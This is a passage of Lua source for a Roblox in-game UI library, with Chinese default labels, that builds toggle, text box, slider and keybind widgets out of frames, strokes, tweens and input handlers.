			local RootSkid = {}

			function RootSkid:Content(Setup)
				Content.Text = Setup
				UpdateBlock()
			end

			function RootSkid:Value(Setup)
				TextLabel.Text = Setup
				UpdateBlock()
			end

			function RootSkid:Fire(...)
				return setup.Callback(...)
			end

			function RootSkid:Title(title)
				TextLabel.Text = title
				UpdateBlock()
			end

			function RootSkid:Visible(value)
				ButtonBlock.Visible = value
			end

			function RootSkid:Hide()
				self:Visible(false)
			end

			function RootSkid:Show()
				self:Visible(true)
			end

			function RootSkid:Toggle()
				self:Visible(not ButtonBlock.Visible)
			end

			return RootSkid
		end

		Library = Library or {}

function Library.ToggleCore(setup, skin)
    setup.Title    = setup.Title   or "切换按钮"
    setup.Content  = setup.Content or ""
    setup.Default  = setup.Default or false
    setup.Callback = setup.Callback or function() end
    setup._Style   = setup._Style or "Norm"

    local block        = Instance.new("Frame")
    block.Name         = setup._Style.."ToggleBlock"
    block.Parent       = ScrollingFrame
    block.BackgroundColor3 = Library.Colors.Default
    block.BackgroundTransparency = 0.25
    block.BorderSizePixel = 0
    block.Size = UDim2.new(0.99, 0, 0, Library.ItemHeight)
    block.ZIndex = 10

    local drop = Instance.new("ImageLabel")
    drop.Name = "DropShadow"
    drop.Parent = block
    drop.BackgroundTransparency = 1
    drop.Image = "rbxassetid://297694300"
    drop.ImageColor3 = Color3.new(0,0,0)
    drop.ImageTransparency = 0.5
    drop.ScaleType = Enum.ScaleType.Slice
    drop.SliceCenter = Rect.new(95,103,894,902)
    drop.SliceScale = 0.05
    drop.Position = UDim2.new(0,-5,0,-5)
    drop.Size = UDim2.new(1,10,1,10)
    drop.ZIndex = 9

    local stroke = Instance.new("UIStroke")
    stroke.Transparency = 0.85
    stroke.Color = Color3.fromRGB(156,156,156)
    stroke.Parent = block

    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.Parent = block
    title.AnchorPoint = Vector2.new(0,0.5)
    title.BackgroundTransparency = 1
    title.Position = UDim2.new(0.02,0,0.5,0)
    title.Size = UDim2.new(1,0,0.4,0)
    title.Font = Enum.Font.Gotham
    title.Text = setup.Title
    title.TextColor3 = Library.Colors.TextColor
    title.TextScaled = true
    title.TextWrapped = true
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.RichText = true
    title.ZIndex = 11

    local content = Instance.new("TextLabel")
    content.Name = "Content"
    content.Parent = block
    content.BackgroundTransparency = 1
    content.Position = UDim2.new(0,5,0,18)
    content.Size = UDim2.new(1,0,0,45)
    content.Visible = false
    content.Font = Enum.Font.Gotham
    content.Text = setup.Content
    content.TextColor3 = Library.Colors.TextColor
    content.TextSize = 13
    content.TextWrapped = true
    content.TextXAlignment = Enum.TextXAlignment.Left
    content.TextYAlignment = Enum.TextYAlignment.Top
    content.RichText = true
    content.ZIndex = 11

    local btn = Instance.new("TextButton")
    btn.Name = "Button"
    btn.Parent = block
    btn.BackgroundTransparency = 1
    btn.TextTransparency = 1
    btn.Size = UDim2.new(1,0,1,0)
    btn.ZIndex = 15

    Library:MakeDrop(block, stroke, Library.Colors.Hightlight)
    if setup.Tip then
        WindowLibrary:AddToolTip(block, tostring(setup.Tip))
    end

    local skinTbl = skin.Build(block, setup.Default)
    local Anim = skinTbl.Anim

    local function refresh(val)
        Anim(val)
        setup.Callback(val)
    end
    refresh(setup.Default)

    btn.MouseButton1Click:Connect(function()
        setup.Default = not setup.Default
        refresh(setup.Default)
    end)

    local function updateSize()
        local ts = title.TextSize
        local mainY = Library:GetTextSize(setup.Title, ts, title.Font).Y
        local subY  = setup.Content:len()>0 and Library:GetTextSize(setup.Content,13,content.Font).Y or 0
        local h = mainY + 10 + (subY>0 and subY+5 or 15)
        block.Size = UDim2.new(0.99,0,0,h)
        content.Visible = subY>0
        if subY>0 then
            title.Position = UDim2.new(0,5,0,12)
            title.Size = UDim2.new(1,0,0,14)
        else
            title.Position = UDim2.new(0.02,0,0.5,0)
            title.Size = UDim2.new(1,0,0.4,0)
        end
    end
    updateSize()

    return {
        Content = function(_,txt) setup.Content=txt updateSize() end,
        Value   = function(_,val) setup.Default=val refresh(val) end,
        Visible = function(_,v) block.Visible=v end
    }
end

function Root:Toggle(setup)
    setup._Style = "Norm"
    return Library.ToggleCore(setup, {
        Build = function(block, first)
            local box = Instance.new("Frame")
            box.Name = "CheckBox"
            box.Parent = block
            box.AnchorPoint = Vector2.new(1,0.5)
            box.Position = UDim2.new(0.98,0,0.5,0)
            box.Size = UDim2.new(0,22,0,22)
            box.BackgroundColor3 = first and Library.Colors.Hightlight or Library.Colors.Default
            box.BackgroundTransparency = 0.5
            box.ZIndex = 14
            local s2 = Instance.new("UIStroke")
            s2.Transparency = 0.85
            s2.Color = Color3.fromRGB(156,156,156)
            s2.Parent = box
            local cr = Instance.new("UICorner")
            cr.CornerRadius = UDim.new(0,3)
            cr.Parent = box

            local tick = Instance.new("TextLabel")
            tick.Name = "CheckMark"
            tick.Parent = box
            tick.AnchorPoint = Vector2.new(0.5,0.5)
            tick.Position = UDim2.new(0.5,0,0.5,0)
            tick.Size = UDim2.new(0.8,0,0.8,0)
            tick.BackgroundTransparency = 1
            tick.Font = Enum.Font.GothamBold
            tick.Text = "✓"
            tick.TextColor3 = Color3.new(1,1,1)
            tick.TextScaled = true
            tick.ZIndex = 15
            tick.Visible = first

            local function anim(v)
                tick.Visible = v
                box.BackgroundColor3 = v and Library.Colors.Hightlight or Library.Colors.Default
            end
            return {ClickZone = block:FindFirstChild("Button"), Anim = anim}
        end
    })
end

function Root:A1Toggle(setup)
    setup._Style = "A1"
    return Library.ToggleCore(setup, {
        Build = function(block, first)
            local skin = makeSliderSkin(block,"A1")
            local function anim(v)
                sliderAnim(skin.ValueBlock, skin.Icon, v, "A1")
            end
            anim(first)
            return {ClickZone = skin.Button, Anim = anim}
        end
    })
end

function Root:A2Toggle(setup)
    setup._Style = "A2"
    return Library.ToggleCore(setup, {
        Build = function(block, first)
            local skin = makeSliderSkin(block,"A2")
            local function anim(v)
                sliderAnim(skin.ValueBlock, skin.Icon, v, "A2")
            end
            anim(first)
            return {ClickZone = skin.Button, Anim = anim}
        end
    })
end

function makeSliderSkin(block,style)
    local blk = Instance.new("Frame")
    blk.Name = "Block"
    blk.Parent = block
    blk.AnchorPoint = Vector2.new(1,0.5)
    blk.Position = UDim2.new(0.98,0,0.5,0)
    blk.Size = UDim2.new(0,35,0.5,0)
    blk.BackgroundColor3 = Library.Colors.Default
    blk.BackgroundTransparency = 0.5
    blk.ZIndex = 14
    local s = Instance.new("UIStroke")
    s.Transparency = 0.85
    s.Color = Color3.fromRGB(156,156,156)
    s.Parent = blk
    local c1 = Instance.new("UICorner")
    c1.CornerRadius = UDim.new(5,100)
    c1.Parent = blk

    local vb = Instance.new("Frame")
    vb.Name = "ValueBlock"
    vb.Parent = blk
    vb.AnchorPoint = Vector2.new(0.5,0.5)
    vb.Position = UDim2.new(first and 0.75 or 0.25,0,0.5,0)
    vb.Size = UDim2.new(0.99,0,0.99,0)
    vb.SizeConstraint = Enum.SizeConstraint.RelativeYY
    vb.BackgroundColor3 = first and Library.Colors.Hightlight or Library.Colors.Disable
    vb.ZIndex = 16
    local c2 = Instance.new("UICorner")
    c2.CornerRadius = UDim.new(1,0)
    c2.Parent = vb

    local img = Instance.new("ImageLabel")
    img.Name = "Icon"
    img.Parent = vb
    img.AnchorPoint = Vector2.new(0.5,0.5)
    img.Position = UDim2.new(0.5,0,0.5,0)
    img.Size = UDim2.new(1,0,1,0)
    img.BackgroundTransparency = 1
    img.ScaleType = Enum.ScaleType.Fit
    img.ZIndex = 17
    if style=="A1" then
        img.Image = "rbxassetid://102797584513959"
        img.Rotation = first and 0 or 180
    else
        img.Image = first and "rbxassetid://88666635012556" or "rbxassetid://123698784885744"
    end

    return {ValueBlock = vb, Icon = img, Button = block:FindFirstChild("Button")}
end

function sliderAnim(vb,icon,v,style)
    if style=="A1" then
        Library:Tween(vb, Library.TweenLibrary.SmallEffect, {Position = UDim2.new(v and 0.75 or 0.25,0,0.5,0)})
        icon.Rotation = v and 0 or 180
        vb.BackgroundColor3 = v and Library.Colors.Hightlight or Library.Colors.Disable
    else
        Library:Tween(vb, Library.TweenLibrary.SmallEffect, {Position = UDim2.new(v and 0.75 or 0.25,0,0.5,0)})
        icon.Image = v and "rbxassetid://88666635012556" or "rbxassetid://123698784885744"
        vb.BackgroundColor3 = v and Library.Colors.Hightlight or Library.Colors.Disable
    end
end
		------ // 输入框   ----------------------------------------------------------------------------------------
		function Root:Textbox(setup)
			setup = setup or {}
			setup.Title = setup.Title or "输入框"
			setup.Content = setup.Content or ""
			setup.PlaceHolder = setup.PlaceHolder or ""
			setup.Default = setup.Default or ""
			setup.Callback = setup.Callback or function() end
			setup.Numeric = setup.Numeric or false

			local TextBoxBlock = Instance.new("Frame")
			local DropShadow = Instance.new("ImageLabel")
			local UIStroke = Instance.new("UIStroke")
			local TextLabel = Instance.new("TextLabel")
			local Content = Instance.new("TextLabel")
			local Block = Instance.new("Frame")
			local UIStroke_2 = Instance.new("UIStroke")
			local UICorner = Instance.new("UICorner")
			local TextBox = Instance.new("TextBox")

			TextBoxBlock.Name = "TextBoxBlock"
			TextBoxBlock.Parent = ScrollingFrame
			TextBoxBlock.BackgroundColor3 = Library.Colors.Default
			TextBoxBlock.BackgroundTransparency = 0.250
			TextBoxBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextBoxBlock.BorderSizePixel = 0
			TextBoxBlock.Size = UDim2.new(0.99000001, 0, 0, Library.ItemHeight)
			TextBoxBlock.ZIndex = 10

			DropShadow.Name = "DropShadow"
			DropShadow.Parent = TextBoxBlock
			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropShadow.BackgroundTransparency = 1.000
			DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
			DropShadow.Position = UDim2.new(0, -5, 0, -5)
			DropShadow.Size = UDim2.new(1, 10, 1, 10)
			DropShadow.ZIndex = 9
			DropShadow.Image = "rbxassetid://297694300"
			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			DropShadow.ImageTransparency = 0.500
			DropShadow.ScaleType = Enum.ScaleType.Slice
			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			DropShadow.SliceScale = 0.050

			UIStroke.Transparency = 0.850
			UIStroke.Color = Color3.fromRGB(156, 156, 156)
			UIStroke.Parent = TextBoxBlock

			TextLabel.Parent = TextBoxBlock
			TextLabel.AnchorPoint = Vector2.new(0, 0.5)
			TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BorderSizePixel = 0
			TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
			TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
			TextLabel.ZIndex = 11
			TextLabel.Font = Enum.Font.Gotham
			TextLabel.Text = setup.Title
			TextLabel.TextColor3 = Library.Colors.TextColor
			TextLabel.TextScaled = true
			TextLabel.TextSize = 14.000
			TextLabel.TextStrokeColor3 = Library.Colors.TextColor
			TextLabel.TextStrokeTransparency = 0.950
			TextLabel.TextWrapped = true
			TextLabel.TextXAlignment = Enum.TextXAlignment.Left
			TextLabel.RichText = true

			Content.Name = "Content"
			Content.Parent = TextBoxBlock
			Content.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Content.BackgroundTransparency = 1.000
			Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Content.BorderSizePixel = 0
			Content.Position = UDim2.new(0, 5, 0, 18)
			Content.Size = UDim2.new(1, 0, 0, 45)
			Content.Visible = false
			Content.ZIndex = 11
			Content.Font = Enum.Font.Gotham
			Content.Text = setup.Content
			Content.TextColor3 = Library.Colors.TextColor
			Content.TextSize = 13.000
			Content.TextStrokeColor3 = Library.Colors.TextColor
			Content.TextStrokeTransparency = 0.950
			Content.TextTransparency = 0.500
			Content.TextWrapped = true
			Content.TextXAlignment = Enum.TextXAlignment.Left
			Content.TextYAlignment = Enum.TextYAlignment.Top
			Content.RichText = true

			Block.Name = "Block"
			Block.Parent = TextBoxBlock
			Block.AnchorPoint = Vector2.new(1, 0.5)
			Block.BackgroundColor3 = Library.Colors.Default
			Block.BackgroundTransparency = 0.500
			Block.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Block.BorderSizePixel = 0
			Block.Position = UDim2.new(0.980000019, 0, 0.5, 0)
			Block.Size = UDim2.new(0, 50, 0.5, 0)
			Block.ZIndex = 14

			UIStroke_2.Transparency = 0.850
			UIStroke_2.Color = Color3.fromRGB(156, 156, 156)
			UIStroke_2.Parent = Block

			UICorner.CornerRadius = UDim.new(0.200000003, 0)
			UICorner.Parent = Block

			TextBox.Parent = Block
			TextBox.AnchorPoint = Vector2.new(0.5, 0.5)
			TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextBox.BackgroundTransparency = 1.000
			TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextBox.BorderSizePixel = 0
			TextBox.Position = UDim2.new(0.5, 0, 0.5, 0)
			TextBox.Size = UDim2.new(0.949999988, 0, 0.550000012, 0)
			TextBox.ZIndex = 11
			TextBox.ClearTextOnFocus = false
			TextBox.Font = Enum.Font.Gotham
			TextBox.PlaceholderColor3 = Library.Colors.TextColor
			TextBox.Text = setup.Default
			TextBox.PlaceholderText = setup.PlaceHolder
			TextBox.TextColor3 = Library.Colors.TextColor
			TextBox.TextSize = 12.000
			TextBox.TextStrokeTransparency = 0.950
			TextBox.TextWrapped = true

			local PlaceHolder = Library:GetTextSize(setup.PlaceHolder, 13, TextBox.Font)

			local Update = function()
				if not WindowLibrary.Toggle then
					return
				end

				local size = Library:GetTextSize(TextBox.Text, TextBox.TextSize, TextBox.Font)

				if WindowLibrary.Toggle then
					pcall(function()
						Library:Tween(Block, Library.TweenLibrary.SmallEffect, {
							Size = UDim2.new(
								0,
								math.clamp(size.X + 15, PlaceHolder.X, TextBoxBlock.AbsoluteSize.X / 1.25),
								0.5,
								0
							),
						})
					end)
				end
			end

			Block.Size = UDim2.new(0, PlaceHolder.X, 0.5, 0)

			Library:MakeDrop(TextBoxBlock, UIStroke, Library.Colors.Hightlight)

			Library:MakeDrop(Block, UIStroke_2, Library.Colors.Hightlight)

			TextBox:GetPropertyChangedSignal("Text"):Connect(function()
				if setup.Numeric then
					TextBox.Text = string.gsub(TextBox.Text, "[^0-9.]", "")

					Update()

					if not tonumber(TextBox.Text) then
						return
					end

					setup.Callback(tonumber(TextBox.Text) or 0)
					return
				end

				Update()
				setup.Callback(TextBox.Text)
			end)

			TextBoxBlock:GetPropertyChangedSignal("AbsoluteSize"):Connect(Update)

			Update()

			local UpdateBlock = function()
				local TitleSize = TextLabel.TextSize
				local MainSize = Library:GetTextSize(setup.Title, TitleSize, TextLabel.Font)
				local ContentSize = setup.Content:len() > 0
						and Library:GetTextSize(setup.Content, Content.TextSize, Content.Font)
					or Vector2.new(0, 0)

				local TotalHeight = MainSize.Y + 10
				if setup.Content:len() > 0 then
					Content.Visible = true
					TotalHeight = TotalHeight + ContentSize.Y + 5
					TextLabel.Position = UDim2.new(0, 5, 0, 12)
					TextLabel.Size = UDim2.new(1, 0, 0, 14)
				else
					Content.Visible = false
					TotalHeight = TotalHeight + 15.20000000000001
					TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
					TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
				end

				TextBoxBlock.Size = UDim2.new(0.99000001, 0, 0, TotalHeight)
			end
			UpdateBlock()

			local RootSkid = {}

			function RootSkid:Content(Setup)
				Content.Text = Setup
				UpdateBlock()
			end

			function RootSkid:Empty()
				setup.Default = ""
				TextBox.Text = ""
				Update()
				setup.Callback("")
			end

			function RootSkid:Value(Setup)
				setup.Default = Setup
				TextBox.Text = setup.Default
				Update()
				setup.Callback(setup.Default)
				UpdateBlock()
			end

			function RootSkid:Visible(value)
				TextBoxBlock.Visible = value
			end

			return RootSkid
		end
		------ // 滑块组件   ----------------------------------------------------------------------------------------
		function Root:Slider(setup)
			setup = setup or {}
			setup.Title = setup.Title or "滑块"
			setup.Content = setup.Content or ""
			setup.Min = setup.Min or 0
			setup.Max = setup.Max or 100
			setup.Default = setup.Default or setup.Min
			setup.Round = setup.Round or 0
			setup.Callback = setup.Callback or function() end

			local SliderBlock = Instance.new("Frame")
			local DropShadow = Instance.new("ImageLabel")
			local UIStroke = Instance.new("UIStroke")
			local TextLabel = Instance.new("TextLabel")
			local Content = Instance.new("TextLabel")
			local Block = Instance.new("Frame")
			local UIStroke_2 = Instance.new("UIStroke")
			local UICorner = Instance.new("UICorner")
			local Move = Instance.new("ImageLabel")
			local UICorner_2 = Instance.new("UICorner")
			local UIStroke_3 = Instance.new("UIStroke")
			local ValueText = Instance.new("TextLabel")
			local InputBox = Instance.new("TextBox")

			SliderBlock.Name = "SliderBlock"
			SliderBlock.Parent = ScrollingFrame
			SliderBlock.BackgroundColor3 = Library.Colors.Default
			SliderBlock.BackgroundTransparency = 0.250
			SliderBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
			SliderBlock.BorderSizePixel = 0
			SliderBlock.Size = UDim2.new(0.99000001, 0, 0, Library.ItemHeight)
			SliderBlock.ZIndex = 10

			DropShadow.Name = "DropShadow"
			DropShadow.Parent = SliderBlock
			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropShadow.BackgroundTransparency = 1.000
			DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
			DropShadow.Position = UDim2.new(0, -5, 0, -5)
			DropShadow.Size = UDim2.new(1, 10, 1, 10)
			DropShadow.ZIndex = 9
			DropShadow.Image = "rbxassetid://297694300"
			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			DropShadow.ImageTransparency = 0.500
			DropShadow.ScaleType = Enum.ScaleType.Slice
			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			DropShadow.SliceScale = 0.050

			UIStroke.Transparency = 0.850
			UIStroke.Color = Color3.fromRGB(156, 156, 156)
			UIStroke.Parent = SliderBlock

			TextLabel.RichText = true
			TextLabel.Parent = SliderBlock
			TextLabel.AnchorPoint = Vector2.new(0, 0.5)
			TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BorderSizePixel = 0
			TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
			TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
			TextLabel.ZIndex = 11
			TextLabel.Font = Enum.Font.Gotham
			TextLabel.Text = setup.Title
			TextLabel.TextColor3 = Library.Colors.TextColor
			TextLabel.TextScaled = true
			TextLabel.TextSize = 14.000
			TextLabel.TextStrokeColor3 = Library.Colors.TextColor
			TextLabel.TextStrokeTransparency = 0.950
			TextLabel.TextWrapped = true
			TextLabel.TextXAlignment = Enum.TextXAlignment.Left

			Content.Name = "Content"
			Content.Parent = SliderBlock
			Content.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Content.BackgroundTransparency = 1.000
			Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Content.BorderSizePixel = 0
			Content.Position = UDim2.new(0, 5, 0, 18)
			Content.Size = UDim2.new(1, 0, 0, 45)
			Content.Visible = false
			Content.ZIndex = 11
			Content.Font = Enum.Font.Gotham
			Content.Text = setup.Content
			Content.TextColor3 = Library.Colors.TextColor
			Content.TextSize = 13.000
			Content.TextStrokeColor3 = Library.Colors.TextColor
			Content.TextStrokeTransparency = 0.950
			Content.TextTransparency = 0.500
			Content.TextWrapped = true
			Content.TextXAlignment = Enum.TextXAlignment.Left
			Content.TextYAlignment = Enum.TextYAlignment.Top
			Content.RichText = true

			Block.Name = "Block"
			Block.Parent = SliderBlock
			Block.AnchorPoint = Vector2.new(1, 0.5)
			Block.BackgroundColor3 = Library.Colors.Default
			Block.BackgroundTransparency = 0.500
			Block.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Block.BorderSizePixel = 0
			Block.Position = UDim2.new(0.980000019, 0, 0.649999976, 0)
			Block.Size = UDim2.new(0, 95, 0.45, 0)
			Block.ZIndex = 14

			UIStroke_2.Transparency = 0.850
			UIStroke_2.Color = Color3.fromRGB(156, 156, 156)
			UIStroke_2.Parent = Block

			UICorner.CornerRadius = UDim.new(0.300000012, 0)
			UICorner.Parent = Block

			Move.Name = "Move"
			Move.Parent = Block
			Move.AnchorPoint = Vector2.new(0.5, 0.5)

			Move.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Move.BackgroundTransparency = 1
			Move.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Move.BorderSizePixel = 0
			Move.Position = UDim2.new(0.5, 0, 0.5, 0)
			Move.Size = UDim2.new(1.5, 0, 1.5, 0)
			Move.SizeConstraint = Enum.SizeConstraint.RelativeYY
			Move.ZIndex = 15
			Move.Image = "rbxassetid://96996396016819"
			Move.ImageColor3 = Color3.fromRGB(255, 255, 255)
			Move.ImageTransparency = 0
			Move.ScaleType = Enum.ScaleType.Slice
			Move.SliceCenter = Rect.new(50, 50, 50, 50)
			Move.SliceScale = 1.0

			UICorner_2.CornerRadius = UDim.new(1, 0)
			UICorner_2.Parent = Move

			UIStroke_3.Transparency = 0.850
			UIStroke_3.Color = Color3.fromRGB(156, 156, 156)
			UIStroke_3.Parent = Move

			ValueText.Name = "ValueText"
			ValueText.Parent = SliderBlock
			ValueText.AnchorPoint = Vector2.new(0, 0.5)
			ValueText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			ValueText.BackgroundTransparency = 1.000
			ValueText.BorderColor3 = Color3.fromRGB(0, 0, 0)
			ValueText.BorderSizePixel = 0
			ValueText.Position = UDim2.new(0.0199999996, 0, 0.239999995, 0)
			ValueText.Size = UDim2.new(0.964999974, 0, 0.25, 0)
			ValueText.ZIndex = 11
			ValueText.Font = Enum.Font.Gotham
			ValueText.Text = tostring(setup.Default)
			ValueText.TextColor3 = Library.Colors.TextColor
			ValueText.TextScaled = true
			ValueText.TextSize = 14.000
			ValueText.TextStrokeColor3 = Library.Colors.TextColor
			ValueText.TextStrokeTransparency = 0.950
			ValueText.TextWrapped = true
			ValueText.TextXAlignment = Enum.TextXAlignment.Right

			InputBox.Name = "InputBox"
			InputBox.Parent = SliderBlock
			InputBox.BackgroundColor3 = Library.Colors.Default
			InputBox.BackgroundTransparency = 1.000
			InputBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
			InputBox.BorderSizePixel = 0
			InputBox.Position = UDim2.new(0.25, 0, 0.4, 0)
			InputBox.Size = UDim2.new(0.180000007, 0, 0.400000006, 0)
			InputBox.ZIndex = 11
			InputBox.Font = Enum.Font.Gotham
			InputBox.TextColor3 = Library.Colors.TextColor
			InputBox.TextScaled = true
			InputBox.TextSize = 14.000
			InputBox.TextStrokeColor3 = Library.Colors.TextColor
			InputBox.TextStrokeTransparency = 0.950
			InputBox.TextWrapped = true
			InputBox.TextXAlignment = Enum.TextXAlignment.Right
			InputBox.Text = tostring(setup.Default)

			local IsHold = false
			local RoundNum = setup.Round

			Library:MakeDrop(SliderBlock, UIStroke, Library.Colors.Hightlight)

			if setup.Tip then
				WindowLibrary:AddToolTip(SliderBlock, tostring(setup.Tip))
			end

			local function Rounding(num, numDecimalPlaces)
				local mult = 10 ^ (numDecimalPlaces or 0)
				return math.floor(num * mult + 0.5) / mult
			end

			local UpdateSize = function()
				if not WindowLibrary.Toggle then
					return
				end

				Block.Size = UDim2.new(0, (SliderBlock.AbsoluteSize.X / 2), 0.225, 0)
			end

			Library:Tween(Move, Library.TweenLibrary.FastEffect, {
				Position = UDim2.new((setup.Default - setup.Min) / (setup.Max - setup.Min), 0, 0.5, 0),
			})

			SliderBlock:GetPropertyChangedSignal("AbsoluteSize"):Connect(UpdateSize)

			local function update(Input)
				local SizeScale =
					math.clamp(((Input.Position.X - Block.AbsolutePosition.X) / Block.AbsoluteSize.X), 0, 1)
				local Main = ((setup.Max - setup.Min) * SizeScale) + setup.Min
				local Value = Rounding(Main, RoundNum)
				local normalized = (Value - setup.Min) / (setup.Max - setup.Min)

				Library:Tween(Move, Library.TweenLibrary.FastEffect, {
					Position = UDim2.new(normalized, 0, 0.5, 0),
				})

				ValueText.Text = tostring(Value)
				InputBox.Text = tostring(Value)

				currentSliderValue = Value
				setup.Callback(Value)
			end

			Block.InputBegan:Connect(function(Input)
				if
					Input.UserInputType == Enum.UserInputType.MouseButton1
					or Input.UserInputType == Enum.UserInputType.Touch
				then
					IsHold = true
					update(Input)
				end
			end)

			Block.InputEnded:Connect(function(Input)
				if
					Input.UserInputType == Enum.UserInputType.MouseButton1
					or Input.UserInputType == Enum.UserInputType.Touch
				then
					IsHold = false
				end
			end)

			Library.UserInputService.InputChanged:Connect(function(Input)
				if IsHold then
					if
						Input.UserInputType == Enum.UserInputType.MouseMovement
						or Input.UserInputType == Enum.UserInputType.Touch
					then
						update(Input)
					end
				end
			end)

			InputBox:GetPropertyChangedSignal("Text"):Connect(function()
				local textValue = tonumber(InputBox.Text) or setup.Default
				if textValue then
					local normalized = (textValue - setup.Min) / (setup.Max - setup.Min)
					Library:Tween(Move, Library.TweenLibrary.FastEffect, {
						Position = UDim2.new(normalized, 0, 0.5, 0),
					})
					ValueText.Text = tostring(textValue)
					setup.Callback(textValue)
				end
			end)

			local UpdateBlock = function()
				local TitleSize = TextLabel.TextSize
				local MainSize = Library:GetTextSize(setup.Title, TitleSize, TextLabel.Font)
				local ContentSize = setup.Content:len() > 0
						and Library:GetTextSize(setup.Content, Content.TextSize, Content.Font)
					or Vector2.new(0, 0)

				local TotalHeight = MainSize.Y + 10
				if setup.Content:len() > 0 then
					Content.Visible = true
					TotalHeight = TotalHeight + ContentSize.Y + 5
					TextLabel.Position = UDim2.new(0, 5, 0, 12)
					TextLabel.Size = UDim2.new(1, 0, 0, 14)
				else
					Content.Visible = false
					TotalHeight = TotalHeight + 15.20000000000001
					TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
					TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
				end

				SliderBlock.Size = UDim2.new(0.99000001, 0, 0, TotalHeight)
			end
			UpdateBlock()

			local RootSkid = {}

			function RootSkid:Content(Setup)
				Content.Text = Setup
				UpdateBlock()
			end

			function RootSkid:Value(Setup)
				setup.Default = Setup

				Library:Tween(Move, Library.TweenLibrary.FastEffect, {
					Position = UDim2.new(setup.Default / setup.Max, 0, 0.5, 0),
				})

				ValueText.Text = tostring(setup.Default) .. "/" .. tostring(setup.Max)
				UpdateBlock()
			end

			function RootSkid:Visible(value)
				SliderBlock.Visible = value
			end

			return RootSkid
		end
		------ // 按钮绑定键<快捷键>   ----------------------------------------------------------------------------------------
		function Root:Keybind(setup)
			setup = setup or {}
			setup.Title = setup.Title or "快捷键"
			setup.Content = setup.Content or ""
			setup.Default = setup.Default or "NONE"
			setup.Callback = setup.Callback or function() end

			local Parser = function(code)
				if typeof(code) == "EnumItem" then
					return code.Name
				end

				local i, d = pcall(function()
					return Enum.KeyCode[code]
				end)

				if i then
					return d.Name
				end

				return "NONE"
			end

			local KeybindBlock = Instance.new("Frame")
			local DropShadow = Instance.new("ImageLabel")
			local UIStroke = Instance.new("UIStroke")
			local TextLabel = Instance.new("TextLabel")
			local Content = Instance.new("TextLabel")
			local Block = Instance.new("Frame")
			local UIStroke_2 = Instance.new("UIStroke")
			local UICorner = Instance.new("UICorner")
			local ValueText = Instance.new("TextLabel")
			local Button = Instance.new("TextButton")

			KeybindBlock.Name = "KeybindBlock"
			KeybindBlock.Parent = ScrollingFrame
			KeybindBlock.BackgroundColor3 = Library.Colors.Default
			KeybindBlock.BackgroundTransparency = 0.250
			KeybindBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
			KeybindBlock.BorderSizePixel = 0
			KeybindBlock.Size = UDim2.new(0.99000001, 0, 0, Library.ItemHeight)
			KeybindBlock.ZIndex = 10

			DropShadow.Name = "DropShadow"
			DropShadow.Parent = KeybindBlock
			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropShadow.BackgroundTransparency = 1.000
			DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
			DropShadow.Position = UDim2.new(0, -5, 0, -5)
			DropShadow.Size = UDim2.new(1, 10, 1, 10)
			DropShadow.ZIndex = 9
			DropShadow.Image = "rbxassetid://297694300"
			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			DropShadow.ImageTransparency = 0.500
			DropShadow.ScaleType = Enum.ScaleType.Slice
			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			DropShadow.SliceScale = 0.050

			UIStroke.Transparency = 0.850
			UIStroke.Color = Color3.fromRGB(156, 156, 156)
			UIStroke.Parent = KeybindBlock

			TextLabel.Parent = KeybindBlock
			TextLabel.AnchorPoint = Vector2.new(0, 0.5)
			TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BorderSizePixel = 0
			TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
			TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
			TextLabel.ZIndex = 11
			TextLabel.Font = Enum.Font.Gotham
			TextLabel.Text = setup.Title
			TextLabel.TextColor3 = Library.Colors.TextColor
			TextLabel.TextScaled = true
			TextLabel.TextSize = 14.000
			TextLabel.TextStrokeColor3 = Library.Colors.TextColor
			TextLabel.TextStrokeTransparency = 0.950
			TextLabel.TextWrapped = true
